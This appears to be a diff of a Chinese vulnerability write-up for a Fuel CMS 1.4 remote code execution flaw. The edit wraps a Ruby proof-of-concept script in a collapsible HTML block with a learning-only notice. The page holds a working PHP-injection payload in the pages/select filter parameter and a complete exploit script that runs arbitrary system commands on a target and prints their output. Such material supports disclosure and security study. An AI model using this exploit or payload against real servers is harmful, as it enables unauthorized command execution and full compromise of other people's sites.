@@ -32,8 +32,10 @@ poc：
 /fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'
 ```
 
-```
-#!/usr/bin/env ruby
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">#!/usr/bin/env ruby
 
 require 'httpclient'
 require 'docopt'
@@ -42,16 +44,16 @@ require 'docopt'
 # https://github.com/nahi/httpclient/issues/242#issuecomment-69013932
 $VERBOSE = nil
 
-doc = <<~DOCOPT
+doc = &lt;&lt;~DOCOPT
   Fuel CMS 1.4 - Remote Code Execution
 
   Usage:
-    #{__FILE__} <url> <cmd>
+    #{__FILE__} &lt;url&gt; &lt;cmd&gt;
     #{__FILE__} -h | --help
 
   Options:
-    <url>         Root URL (base path) including HTTP scheme, port and root folder
-    <cmd>         The system command to execute
+    &lt;url&gt;         Root URL (base path) including HTTP scheme, port and root folder
+    &lt;cmd&gt;         The system command to execute
     -h, --help    Show this screen
 
   Examples:
@@ -64,17 +66,18 @@ def exploit(client, root_url, cmd)
 
   res = client.get(url)
 
-  /system(.+?)<div/mx.match(res.body).captures[0].chomp
+  /&#115;ystem(.+?)&lt;div/mx.match(res.body).captures[0].chomp
 end
 
 begin
   args = Docopt.docopt(doc)
   clnt = HTTPClient.new
-  puts exploit(clnt, args['<url>'], args['<cmd>'])
-rescue Docopt::Exit => e
+  puts exploit(clnt, args['&lt;url&gt;'], args['&lt;cmd&gt;'])
+rescue Docopt::Exit =&gt; e
   puts e.message
-end
-```
+end</code></pre>
+
+</details>
 
 ---
 
